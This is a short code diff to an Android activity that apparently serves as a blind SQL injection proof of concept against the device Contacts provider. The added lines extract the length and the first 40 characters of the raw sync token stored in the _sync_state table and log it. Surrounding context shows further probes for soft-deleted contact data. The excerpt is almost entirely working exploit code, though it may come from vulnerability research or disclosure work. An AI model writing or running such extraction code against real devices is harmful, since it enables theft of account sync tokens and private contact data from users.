@@ -135,6 +135,16 @@ public class ContactsBlindSqliActivity extends Activity {
             log("SyncState[" + i + "]: " + syncAcct);
         }
 
+        // 4e: Extract raw sync token from _sync_state.data column
+        log("--- Sync state raw token ---");
+        int syncDataLen = extractNumber(uri, "(SELECT length(data) FROM _sync_state LIMIT 1)");
+        log("SyncState data length: " + syncDataLen + " bytes");
+        if (syncDataLen > 0) {
+            String syncToken = extractString(uri,
+                "(SELECT data FROM _sync_state LIMIT 1)", Math.min(syncDataLen, 40));
+            log("SyncState token (first 40 chars): " + syncToken);
+        }
+
         // Test 5: Try to access deleted contacts (soft-deleted data)
         log("\n=== Test 5: Deleted contacts data ===");
         int deletedCount = extractNumber(uri,
